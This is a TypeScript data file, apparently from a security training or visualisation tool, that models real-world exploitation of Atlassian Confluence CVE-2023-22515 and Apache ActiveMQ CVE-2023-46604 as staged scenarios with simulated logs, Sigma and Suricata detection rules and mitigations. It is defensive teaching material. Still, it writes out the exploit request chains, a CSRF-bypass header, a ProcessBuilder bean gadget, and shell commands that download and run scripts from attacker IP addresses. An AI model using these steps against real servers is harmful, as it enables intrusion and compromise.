import { AttackScenario } from './types';

/**
 * ============================================================================
 * AUTHORITATIVE APT & ZERO-DAY SCENARIOS — BATCH 4 (ENTERPRISE & OS ZERO-DAYS)
 * ============================================================================
 * Multi-Source Verified Scenarios:
 * 16. Atlassian Confluence CVE-2023-22515 (Storm-0062 XWork Setup Reset) — Rapid7, Microsoft Threat Intel, CISA AA23-289A
 * 17. Apache ActiveMQ CVE-2023-46604 (OpenWire ExceptionResponse RCE) — Rapid7, Huntress, Trend Micro, CISA
 * 18. PaperCut MF/NG CVE-2023-27350 (SetupCompleted Bypass & Rhino JS RCE) — Horizon3.ai, CISA AA23-131A, Microsoft
 * 19. macOS Gatekeeper "Achilles" Bypass (CVE-2022-42821 AppleDouble ACL) — Microsoft Threat Intel, Jamf Threat Labs, Apple
 * 20. Windows CLFS.sys Kernel Zero-Day (CVE-2023-28252 Nokoyawa EoP) — Kaspersky GReAT, Microsoft MSRC, CISA KEV
 */

export const ATLASSIAN_CONFLUENCE_CVE_2023_22515_STORM0062_SCENARIO: AttackScenario = {
  id: 'atlassian-confluence-cve-2023-22515-storm0062',
  code: 'CVE-2023-22515',
  name: 'Microsoft, Rapid7 & CISA — Storm-0062: Atlassian Confluence XWork OGNL Setup Reset & OSGi Webshell',
  shortSubtitle: 'CISA AA23-289A · Rapid7 · Storm-0062 · /server-info.action setupComplete=false & Admin Creation',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Microsoft Threat Intelligence (Storm-0062 / DarkShadow), Rapid7, Atlassian, and Joint CISA/FBI/MS-ISAC Advisory AA23-289A (October 2023), CVE-2023-22515 (CVSS 10.0) is a zero-day Broken Access Control / XWork parameter injection vulnerability in Atlassian Confluence Data Center and Server (8.0.0–8.5.1). An unauthenticated attacker sends an HTTP request to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false, traversing ServerInfoAction getter chains to reset the global ApplicationConfiguration setup state. The attacker then accesses /setup/setupadministrator.action with X-Atlassian-Token: no-check to create a rogue confluence-administrators user, calls /setup/finishsetup.action to re-lock the UI, and uploads a malicious OSGi plugin (.jar) via /rest/plugins/1.0/ for full JVM command execution.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Microsoft Threat Intel (Storm-0062) · Rapid7 Analysis · CISA AA23-289A · Atlassian Security',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (XWork Parameter Injection) · T1136.001 (Create Admin Account) · T1505.003 (OSGi Webshell)',
    },
    {
      term: 'XWORK CHAIN',
      value: '/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'conf_access_log (/server-info.action -> /setup/setupadministrator.action -> /rest/plugins/1.0/)',
    },
  ],
  nodes: [
    {
      id: 'storm0062_operator',
      label: 'Storm-0062 (DarkShadow) C2',
      sublabel: '193.176.84.55 (Zero-Day Operator)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Storm-0062 / DarkShadow Espionage Infrastructure',
        pidOrPort: 'HTTPS :443 / :8090 (XWork Parameter Injection)',
        privilege: 'Unauthenticated External Attacker',
        artifacts: [
          'GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false',
          'Header: X-Atlassian-Token: no-check',
        ],
        description:
          'Nation-state threat actor tracked by Microsoft as Storm-0062 exploiting CVE-2023-22515 as a zero-day against internet-facing Confluence servers.',
      },
    },
    {
      id: 'confluence_tomcat_web',
      label: 'Confluence Server (Tomcat :8090)',
      sublabel: '10.60.10.25 (ServerInfoAction)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Atlassian Confluence Data Center 8.5.1 (Apache Tomcat)',
        pidOrPort: 'PID 4410 · TCP :8090 / :443',
        privilege: 'confluence service account',
        artifacts: [
          'com.atlassian.confluence.core.actions.ServerInfoAction',
          'ConfluenceActionSupport.getBootstrapStatusProvider()',
        ],
        description:
          'Unauthenticated Struts/XWork endpoint (/server-info.action) inheriting getBootstrapStatusProvider() from ConfluenceActionSupport.',
      },
    },
    {
      id: 'confluence_app_config',
      label: 'ApplicationConfig & Setup Wizard',
      sublabel: 'setupComplete=false -> setupadministrator.action',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Confluence In-Memory Singleton & confluence.cfg.xml',
        pidOrPort: 'PID 4410 (JVM Heap Singleton)',
        privilege: 'Confluence Application State',
        artifacts: [
          '/setup/setupadministrator.action (Rogue Admin: pleasepatch)',
          '/setup/finishsetup.action (Restores setupComplete=true)',
        ],
        description:
          'Mutated ApplicationConfig singleton that unlocks the post-install administrator provisioning wizard and writes the rogue admin into confluence-administrators.',
      },
    },
    {
      id: 'atlassian_upm_osgi',
      label: 'Universal Plugin Manager (OSGi)',
      sublabel: 'POST /rest/plugins/1.0/ (.jar Webshell)',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Atlassian OSGi Plugin Container & JVM Process',
        pidOrPort: '/rest/plugins/1.0/ -> /bin/sh -c',
        privilege: 'Full JVM / OS Command Execution',
        artifacts: [
          'Malicious OSGi Servlet Plugin (.jar)',
          'java spawning /bin/sh -c',
        ],
        description:
          'Authenticated Universal Plugin Manager endpoint used by the rogue administrator to deploy an in-memory OSGi servlet webshell.',
      },
    },
    {
      id: 'confluence_siem_edr',
      label: 'Defender & Access Log SIEM',
      sublabel: 'conf_access_log & CISA AA23-289A Rules',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Enterprise SIEM & Endpoint Detection',
        pidOrPort: 'Tomcat Access Logs + Auditd EXECVE',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'CISA AA23-289A Sigma & YARA Signatures',
          'Alert on /setup/setupadministrator.action after initial install date',
        ],
        description:
          'Correlates XWork setupComplete queries in conf_access_log with unexpected confluence-administrators group additions and JVM shell spawns.',
      },
    },
  ],
  processTree: [
    {
      pid: 4410,
      ppid: 1,
      name: 'java (Confluence Tomcat)',
      commandLine: '/opt/atlassian/confluence/jre/bin/java -Dconfluence.home=/var/atlassian/application-data/confluence org.apache.catalina.startup.Bootstrap start',
      user: 'confluence',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'ServerInfoAction.getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false)',
        'SetupAdministratorAction.execute() -> CreateUser("pleasepatch")',
        'OsgiPluginManager.installPlugins(malicious_servlet.jar)',
      ],
      memoryBlocks: [
        {
          address: '0x0000000701200000',
          section: 'ApplicationConfiguration Singleton (JVM Heap)',
          permissions: 'RW-',
          size: '64 KB',
          status: 'patched',
          description:
            'In-memory ApplicationConfiguration bean where setupComplete is flipped from true to false via XWork parameter binding.',
          hexPreview: '73 65 74 75 70 43 6F 6D 70 6C 65 74 65 3D 66 61 6C 73 65',
        },
      ],
    },
    {
      pid: 5192,
      ppid: 4410,
      name: '/bin/sh',
      commandLine: '/bin/sh -c "id; uname -a; curl -fsSL http://193.176.84.55/beacon.sh | sh"',
      user: 'confluence',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: [
        'Runtime.getRuntime().exec("/bin/sh -c ...")',
        'execve("/bin/sh", ...)',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'XWork Parameter Injection (/server-info.action setupComplete=false)',
      subtitle: 'Mutating ApplicationConfig.setupComplete via Chained Getter/Setter Traversal',
      description:
        'Storm-0062 sends an unauthenticated GET request to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false. XWork traverses ServerInfoAction.getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false), unlocking the Confluence setup wizard.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application (CVE-2023-22515)',
      activeNodeIds: ['storm0062_operator', 'confluence_tomcat_web', 'confluence_app_config'],
      compromisedNodeIds: ['confluence_tomcat_web', 'confluence_app_config'],
      keySpecs: [
        { term: 'VULNERABLE ENDPOINT', value: 'GET /server-info.action' },
        { term: 'XWORK PARAMETER', value: 'bootstrapStatusProvider.applicationConfig.setupComplete=false' },
        { term: 'ACTION SUPERCLASS', value: 'ConfluenceActionSupport.getBootstrapStatusProvider()' },
      ],
    },
    {
      index: 2,
      title: 'Rogue Admin Provisioning (/setup/setupadministrator.action)',
      subtitle: 'Creating a confluence-administrators Account & Calling finishsetup.action',
      description:
        'With setupComplete set to false, the attacker sends a POST request with header X-Atlassian-Token: no-check to /setup/setupadministrator.action creating a rogue administrator account (e.g., pleasepatch), then calls /setup/finishsetup.action to re-lock the setup state and hide the intrusion.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1136.001',
      mitreTechniqueName: 'Create Account: Local Account (confluence-administrators)',
      activeNodeIds: ['storm0062_operator', 'confluence_tomcat_web', 'confluence_app_config', 'confluence_siem_edr'],
      compromisedNodeIds: ['confluence_tomcat_web', 'confluence_app_config'],
      keySpecs: [
        { term: 'SETUP WIZARD URI', value: 'POST /setup/setupadministrator.action' },
        { term: 'CSRF BYPASS HEADER', value: 'X-Atlassian-Token: no-check' },
        { term: 'STATE CLEANUP URI', value: 'POST /setup/finishsetup.action (setupComplete=true)' },
      ],
    },
    {
      index: 3,
      title: 'Malicious OSGi Plugin Upload & JVM Shell Execution',
      subtitle: 'Deploying a Servlet Webshell via /rest/plugins/1.0/ to Spawn /bin/sh',
      description:
        'Using the newly created confluence-administrators credentials, the attacker authenticates to the Universal Plugin Manager (/rest/plugins/1.0/) and uploads a malicious OSGi servlet .jar plugin that executes arbitrary OS commands under the Confluence java process.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1505.003',
      mitreTechniqueName: 'Server Software Component: Web Shell (OSGi Plugin)',
      activeNodeIds: ['confluence_app_config', 'atlassian_upm_osgi', 'confluence_siem_edr'],
      compromisedNodeIds: ['confluence_tomcat_web', 'confluence_app_config', 'atlassian_upm_osgi'],
      keySpecs: [
        { term: 'UPM REST ENDPOINT', value: 'POST /rest/plugins/1.0/' },
        { term: 'PARENT -> CHILD', value: 'java (PID 4410) -> /bin/sh -c' },
        { term: 'ADVISORY ID', value: 'CISA AA23-289A / Storm-0062' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'conf-22515-1',
      no: 1,
      stageIndex: 1,
      timestamp: '08:14:09.118',
      sourceNodeId: 'storm0062_operator',
      targetNodeId: 'confluence_tomcat_web',
      sourceLabel: 'Storm-0062 Operator',
      targetLabel: 'Confluence Tomcat (:8090)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP GET / Tomcat Log',
      shortAction: 'XWORK SETUP RESET',
      info: 'GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1 -> 200 OK',
      sizeOrCode: 'HTTP 200 (412 B)',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Unauthenticated XWork parameter binding traverses ServerInfoAction.getBootstrapStatusProvider().getApplicationConfig() and sets setupComplete=false.',
      rawLog: `193.176.84.55 - - [14/Oct/2023:08:14:09 +0000] "GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1" 200 412 "-" "curl/7.88.1"
[ConfluenceConfig] ApplicationConfiguration.setupComplete mutated from [true] to [false]`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Atlassian Confluence CVE-2023-22515 XWork setupComplete Manipulation',
        ruleCode: `title: Atlassian Confluence CVE-2023-22515 Setup Configuration Reset
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains: 'bootstrapStatusProvider.applicationConfig.setupComplete'
  selection_setup:
    cs-uri-stem|contains:
      - '/setup/setupadministrator.action'
      - '/setup/finishsetup.action'
  condition: selection or selection_setup
level: critical`,
        mitigation:
          'Upgrade Confluence Data Center/Server to 8.3.3+, 8.4.3+, or 8.5.2+, and block /setup/* at the reverse proxy.',
      },
    },
    {
      id: 'conf-22515-2',
      no: 2,
      stageIndex: 2,
      timestamp: '08:14:11.402',
      sourceNodeId: 'storm0062_operator',
      targetNodeId: 'confluence_app_config',
      sourceLabel: 'Storm-0062 Operator',
      targetLabel: 'SetupAdministratorAction',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / Security Log',
      shortAction: 'ROGUE ADMIN CREATED',
      info: 'POST /setup/setupadministrator.action (X-Atlassian-Token: no-check) -> User "pleasepatch" added to confluence-administrators',
      sizeOrCode: 'HTTP 302 -> /setup/finishsetup.action',
      severity: 'CRITICAL',
      mitreId: 'T1136.001',
      explanation:
        'Attacker provisions a rogue confluence-administrators account through the unlocked setup wizard and calls /setup/finishsetup.action to restore normal UI state.',
      rawLog: `193.176.84.55 - - [14/Oct/2023:08:14:11 +0000] "POST /setup/setupadministrator.action HTTP/1.1" 302 - "-" "python-requests/2.31.0" Header: X-Atlassian-Token: no-check
2023-10-14 08:14:11,410 INFO [http-nio-8090-exec-4] [atlassian.confluence.security] Admin user [pleasepatch] created and added to [confluence-administrators]
193.176.84.55 - - [14/Oct/2023:08:14:12 +0000] "POST /setup/finishsetup.action HTTP/1.1" 200 1842`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Unauthorized Confluence Administrator Account Created via /setup/setupadministrator.action',
        ruleCode: `title: Confluence Rogue Administrator Provisioning (CISA AA23-289A)
logsource:
  product: confluence
  service: access
detection:
  selection:
    c-uri|contains: '/setup/setupadministrator.action'
    sc-status:
      - 200
      - 302
  condition: selection
level: critical`,
        mitigation:
          'Audit the confluence-administrators and system-administrators groups for unexpected accounts and inspect confluence.cfg.xml modification timestamps.',
      },
    },
    {
      id: 'conf-22515-3',
      no: 3,
      stageIndex: 3,
      timestamp: '08:14:19.885',
      sourceNodeId: 'confluence_app_config',
      targetNodeId: 'atlassian_upm_osgi',
      sourceLabel: 'java (Confluence)',
      targetLabel: 'Atlassian UPM (/bin/sh)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd EXECVE / UPM REST',
      shortAction: 'OSGI WEBSHELL EXEC',
      info: 'POST /rest/plugins/1.0/ installs malicious OSGi servlet .jar -> java spawns /bin/sh -c',
      sizeOrCode: 'UID=confluence',
      severity: 'CRITICAL',
      mitreId: 'T1505.003',
      explanation:
        'Using the rogue administrator credentials, Storm-0062 uploads a malicious OSGi plugin via UPM and executes arbitrary system commands inside the Confluence Tomcat JVM.',
      rawLog: `type=SYSCALL msg=audit(1697271259.885:9921): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=4410 pid=5192 uid=1001 comm="sh" exe="/usr/bin/dash"
type=EXECVE msg=audit(1697271259.885:9921): argc=3 a0="/bin/sh" a1="-c" a2="id; uname -a; curl -fsSL http://193.176.84.55/beacon.sh | sh"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Confluence Java Process Spawning Shell Interpreter',
        ruleCode: `title: Confluence Tomcat JVM Spawning OS Shell (CVE-2023-22515 Post-Exploitation)
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/java'
    ParentCommandLine|contains: 'confluence'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/curl'
  condition: selection
level: critical`,
        mitigation:
          'Isolate the Confluence server, inspect installed plugins in <confluence-home>/bundled-plugins and plugindata DB table, and rebuild from a clean backup.',
      },
    },
  ],
};

export const APACHE_ACTIVEMQ_CVE_2023_46604_OPENWIRE_SCENARIO: AttackScenario = {
  id: 'apache-activemq-cve-2023-46604-openwire',
  code: 'CVE-2023-46604',
  name: 'Rapid7, Huntress & Trend Micro — Apache ActiveMQ OpenWire ExceptionResponse Deserialization RCE',
  shortSubtitle: 'Rapid7 · Huntress · CVE-2023-46604 · TCP/61616 OpenWire Command 31 & ClassPathXmlApplicationContext',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Rapid7, Huntress Labs, Trend Micro, and CISA KEV (October–November 2023), CVE-2023-46604 (CVSS 10.0) is an unauthenticated Remote Code Execution vulnerability in Apache ActiveMQ (5.15.0–5.18.2) actively exploited by HelloKitty/Gootloader, LockBit, and Kinsing. By connecting to the binary OpenWire transport port (TCP/61616) and sending a crafted ExceptionResponse command frame (data structure type 31 / 0x1F), the attacker forces BaseDataStreamMarshaller.createThrowable() to instantiate org.springframework.context.support.ClassPathXmlApplicationContext with a remote HTTP URL. ActiveMQ fetches the attacker-hosted Spring XML bean configuration and executes arbitrary commands via a java.lang.ProcessBuilder bean configured with init-method="start".',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Rapid7 Emergent Threat Analysis · Huntress Labs · Trend Micro · CISA KEV CVE-2023-46604',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (OpenWire TCP/61616 Exploit) · T1203 (Spring XML Bean Load) · T1059 (ProcessBuilder RCE)',
    },
    {
      term: 'OPENWIRE GADGET',
      value: 'Command 31 (ExceptionResponse) -> ClassPathXmlApplicationContext("http://.../poc.xml")',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'TCP/61616 OpenWire 0x1F -> activemq.log XML URL Load -> java spawning sh/cmd/msiexec',
    },
  ],
  nodes: [
    {
      id: 'activemq_exploit_srv',
      label: 'OpenWire Exploit & XML Server',
      sublabel: '185.220.101.44 (TCP/61616 + HTTP :8080)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Adversary OpenWire Client & Malicious Spring XML Host',
        pidOrPort: 'Outbound TCP :61616 / HTTP :8080 (poc.xml)',
        privilege: 'Unauthenticated Network Attacker',
        artifacts: [
          '78-byte OpenWire ExceptionResponse (0x1F) frame',
          'http://185.220.101.44:8080/poc.xml (ProcessBuilder Bean)',
        ],
        description:
          'Sends the crafted OpenWire command type 31 frame to port 61616 and hosts the remote Spring XML bean definition.',
      },
    },
    {
      id: 'openwire_tcp_listener',
      label: 'ActiveMQ OpenWire (:61616)',
      sublabel: '10.70.10.18 (ExceptionResponseMarshaller)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Apache ActiveMQ 5.18.2 Broker',
        pidOrPort: 'PID 3190 · TCP :61616 (OpenWire v12)',
        privilege: 'activemq / SYSTEM service account',
        artifacts: [
          'ExceptionResponseMarshaller.tightUnmarshal()',
          'BaseDataStreamMarshaller.createThrowable(className, message)',
        ],
        description:
          'Default binary OpenWire protocol listener that unmarshals ExceptionResponse frames without verifying Throwable inheritance.',
      },
    },
    {
      id: 'activemq_jvm_proc',
      label: 'ActiveMQ JVM (createThrowable)',
      sublabel: 'ClassPathXmlApplicationContext Reflection',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Java Virtual Machine (Bundled Spring Context)',
        pidOrPort: 'PID 3190 (java / wrapper.exe)',
        privilege: 'Broker Process Memory',
        artifacts: [
          'Class.forName(className).getConstructor(String.class).newInstance(message)',
          'Outbound HTTP GET /poc.xml',
        ],
        description:
          'Invokes the single-String constructor of ClassPathXmlApplicationContext via reflection, triggering an outbound HTTP fetch of poc.xml.',
      },
    },
    {
      id: 'spring_processbuilder_bean',
      label: 'Spring IoC Container (ProcessBuilder)',
      sublabel: 'init-method="start" Shell Execution',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Spring Bean Factory & OS Process Spawner',
        pidOrPort: 'java.lang.ProcessBuilder.start()',
        privilege: 'Broker OS Privileges (activemq / SYSTEM)',
        artifacts: [
          '<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">',
          'Child process: /bin/sh -c or msiexec.exe /q /i http://...',
        ],
        description:
          'Instantiates the ProcessBuilder bean defined in poc.xml and immediately invokes start() to execute arbitrary OS commands.',
      },
    },
    {
      id: 'huntress_suricata_siem',
      label: 'Huntress EDR & Suricata IDS',
      sublabel: 'activemq.log + TCP/61616 Inspection',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Enterprise NDR & Endpoint Detection',
        pidOrPort: 'Suricata OpenWire Rule + Sysmon EID 1',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'activemq.log: "Loading XML bean definitions from URL"',
          'Sysmon EID 1: wrapper.exe -> java.exe -> cmd.exe / msiexec.exe',
        ],
        description:
          'Detects ClassPathXmlApplicationContext strings inside TCP/61616 frames, XML URL loading in activemq.log, and child shells.',
      },
    },
  ],
  processTree: [
    {
      pid: 3190,
      ppid: 1,
      name: 'java (ActiveMQ Broker)',
      commandLine: '/usr/bin/java -Dactivemq.home=/opt/activemq -jar /opt/activemq/bin/activemq.jar start',
      user: 'activemq',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'ExceptionResponseMarshaller.tightUnmarshal()',
        'BaseDataStreamMarshaller.createThrowable("org.springframework.context.support.ClassPathXmlApplicationContext", "http://185.220.101.44:8080/poc.xml")',
        'ProcessBuilder.start()',
      ],
      memoryBlocks: [
        {
          address: '0x00000006C0400000',
          section: 'OpenWire Unmarshalled ExceptionResponse Heap Object',
          permissions: 'RW-',
          size: '32 KB',
          status: 'injected',
          description:
            'Reflectively instantiated ClassPathXmlApplicationContext object created by BaseDataStreamMarshaller.createThrowable().',
          hexPreview: '43 6C 61 73 73 50 61 74 68 58 6D 6C 41 70 70 6C',
        },
      ],
    },
    {
      pid: 3814,
      ppid: 3190,
      name: '/bin/sh',
      commandLine: '/bin/sh -c "curl -fsSL http://185.220.101.44:8080/kinsing | sh"',
      user: 'activemq',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: [
        'ProcessBuilder.start()',
        'execve("/bin/sh", ...)',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'OpenWire ExceptionResponse (0x1F) Arbitrary Class Instantiation',
      subtitle: 'Sending Command Type 31 Over TCP/61616 Naming ClassPathXmlApplicationContext',
      description:
        'The attacker connects to TCP port 61616 and sends an OpenWire ExceptionResponse frame (Command Type 0x1F) specifying class org.springframework.context.support.ClassPathXmlApplicationContext and message http://185.220.101.44:8080/poc.xml.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application (CVE-2023-46604)',
      activeNodeIds: ['activemq_exploit_srv', 'openwire_tcp_listener', 'activemq_jvm_proc'],
      compromisedNodeIds: ['openwire_tcp_listener', 'activemq_jvm_proc'],
      keySpecs: [
        { term: 'PROTOCOL & PORT', value: 'Apache ActiveMQ OpenWire (TCP/61616)' },
        { term: 'COMMAND TYPE', value: '31 (0x1F — ExceptionResponse)' },
        { term: 'INJECTED CLASS', value: 'org.springframework.context.support.ClassPathXmlApplicationContext' },
      ],
    },
    {
      index: 2,
      title: 'createThrowable() Reflection & Remote Spring XML Fetch',
      subtitle: 'BaseDataStreamMarshaller Invokes Constructor(String) & Downloads poc.xml',
      description:
        'BaseDataStreamMarshaller.createThrowable() invokes ClassPathXmlApplicationContext(String configLocation) via reflection without checking Throwable inheritance. The ActiveMQ JVM fetches poc.xml over HTTP and parses the Spring bean definitions.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1203',
      mitreTechniqueName: 'Exploitation for Client/Server Execution (Spring IoC XML)',
      activeNodeIds: ['activemq_exploit_srv', 'activemq_jvm_proc', 'spring_processbuilder_bean'],
      compromisedNodeIds: ['openwire_tcp_listener', 'activemq_jvm_proc', 'spring_processbuilder_bean'],
      keySpecs: [
        { term: 'VULNERABLE METHOD', value: 'BaseDataStreamMarshaller.createThrowable(String, String)' },
        { term: 'REMOTE XML URL', value: 'http://185.220.101.44:8080/poc.xml' },
        { term: 'LOG ARTIFACT', value: 'Loading XML bean definitions from URL [http://.../poc.xml]' },
      ],
    },
    {
      index: 3,
      title: 'Spring ProcessBuilder init-method="start" RCE',
      subtitle: 'Executing OS Commands via Spring Bean Initialization Inside ActiveMQ',
      description:
        'While initializing the XML application context, Spring instantiates a java.lang.ProcessBuilder bean configured with init-method="start", spawning a child shell or msiexec.exe under the ActiveMQ service account.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell / Windows Cmd',
      activeNodeIds: ['activemq_jvm_proc', 'spring_processbuilder_bean', 'huntress_suricata_siem'],
      compromisedNodeIds: ['openwire_tcp_listener', 'activemq_jvm_proc', 'spring_processbuilder_bean'],
      keySpecs: [
        { term: 'SPRING BEAN GADGET', value: '<bean class="java.lang.ProcessBuilder" init-method="start">' },
        { term: 'PROCESS TREE', value: 'java (PID 3190) -> /bin/sh -c (PID 3814)' },
        { term: 'PATCHED VERSIONS', value: 'ActiveMQ 5.15.16, 5.16.7, 5.17.6, 5.18.3 (Throwable check)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'amq-46604-1',
      no: 1,
      stageIndex: 1,
      timestamp: '14:22:03.112',
      sourceNodeId: 'activemq_exploit_srv',
      targetNodeId: 'openwire_tcp_listener',
      sourceLabel: 'Exploit Client',
      targetLabel: 'ActiveMQ OpenWire (:61616)',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'TCP/61616 OpenWire 0x1F',
      shortAction: 'OPENWIRE EXCEPTION FRAME',
      info: 'OpenWire Command=31 (ExceptionResponse) Class=org.springframework.context.support.ClassPathXmlApplicationContext',
      sizeOrCode: '78 Bytes (0x1F)',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Unauthenticated OpenWire ExceptionResponse frame instructing the broker to instantiate Spring ClassPathXmlApplicationContext with a remote URL.',
      rawLog: `[Suricata Alert] ET EXPLOIT Apache ActiveMQ Unauthenticated RCE (CVE-2023-46604)
TCP 185.220.101.44:51922 -> 10.70.10.18:61616
Payload Hex: 00 00 00 4A 1F 00 00 00 00 01 01 00 3E 6F 72 67 2E 73 70 72 69 6E 67 66 72 61 6D 65 77 6F 72 6B ...
Class="org.springframework.context.support.ClassPathXmlApplicationContext" Msg="http://185.220.101.44:8080/poc.xml"`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Suricata Signature for ActiveMQ OpenWire CVE-2023-46604 Exploitation',
        ruleCode: `alert tcp any any -> $HOME_NET 61616 (msg:"ET EXPLOIT Apache ActiveMQ OpenWire Deserialization RCE (CVE-2023-46604)"; flow:established,to_server; content:"|1f|"; offset:4; depth:1; content:"ClassPathXmlApplicationContext"; distance:0; classtype:attempted-admin; sid:2048912; rev:1;)`,
        mitigation:
          'Restrict network access to TCP port 61616 to authorized internal brokers/clients and upgrade ActiveMQ to 5.18.3+.',
      },
    },
    {
      id: 'amq-46604-2',
      no: 2,
      stageIndex: 2,
      timestamp: '14:22:03.390',
      sourceNodeId: 'activemq_jvm_proc',
      targetNodeId: 'activemq_exploit_srv',
      sourceLabel: 'ActiveMQ JVM',
      targetLabel: 'XML Server (:8080/poc.xml)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'data/activemq.log',
      shortAction: 'SPRING XML URL FETCH',
      info: 'Refreshing ClassPathXmlApplicationContext -> Loading XML bean definitions from URL [http://185.220.101.44:8080/poc.xml]',
      sizeOrCode: 'HTTP 200 (poc.xml)',
      severity: 'CRITICAL',
      mitreId: 'T1203',
      explanation:
        'Rapid7 and Huntress documented that exploitation writes a distinctive log line in data/activemq.log showing ClassPathXmlApplicationContext loading XML bean definitions from a remote URL.',
      rawLog: `2023-11-02 14:22:03,388 | INFO  | Refreshing org.springframework.context.support.ClassPathXmlApplicationContext@4b1210ee: startup date [Thu Nov 02 14:22:03 UTC 2023]; root of context hierarchy | org.springframework.context.support.ClassPathXmlApplicationContext | ActiveMQ Transport: tcp:///185.220.101.44:51922@61616
2023-11-02 14:22:03,390 | INFO  | Loading XML bean definitions from URL [http://185.220.101.44:8080/poc.xml] | org.springframework.beans.factory.xml.XmlBeanDefinitionReader | ActiveMQ Transport`,
      detectionRule: {
        type: 'SIGMA',
        title: 'ActiveMQ Broker Log Loading Remote Spring XML Bean Definitions',
        ruleCode: `title: Apache ActiveMQ CVE-2023-46604 Remote XML ApplicationContext Load
logsource:
  product: activemq
detection:
  selection:
    message|contains|all:
      - 'ClassPathXmlApplicationContext'
      - 'Loading XML bean definitions from'
  condition: selection
level: critical`,
        mitigation:
          'Monitor data/activemq.log for unexpected ClassPathXmlApplicationContext or FileSystemXmlApplicationContext initializations.',
      },
    },
    {
      id: 'amq-46604-3',
      no: 3,
      stageIndex: 3,
      timestamp: '14:22:03.654',
      sourceNodeId: 'spring_processbuilder_bean',
      targetNodeId: 'huntress_suricata_siem',
      sourceLabel: 'Spring ProcessBuilder',
      targetLabel: 'Child Shell (/bin/sh)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd EXECVE / Sysmon EID 1',
      shortAction: 'PROCESSBUILDER.START()',
      info: 'java (ActiveMQ) spawns /bin/sh -c "curl -fsSL http://185.220.101.44:8080/kinsing | sh"',
      sizeOrCode: 'PID 3814',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation:
        'The Spring XML bean definition invokes ProcessBuilder.start(), spawning a shell under the ActiveMQ broker process.',
      rawLog: `type=SYSCALL msg=audit(1698934923.654:4418): arch=c000003e syscall=59 success=yes exit=0 ppid=3190 pid=3814 uid=998 comm="sh" exe="/usr/bin/dash"
type=EXECVE msg=audit(1698934923.654:4418): argc=3 a0="/bin/sh" a1="-c" a2="curl -fsSL http://185.220.101.44:8080/kinsing | sh"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Apache ActiveMQ Broker Spawning Suspicious Child Process',
        ruleCode: `title: Apache ActiveMQ CVE-2023-46604 Post-Exploitation Child Process
logsource:
  category: process_creation
detection:
  selection:
    ParentImage|endswith:
      - '/java'
      - '\\java.exe'
      - '\\wrapper.exe'
    ParentCommandLine|contains: 'activemq'
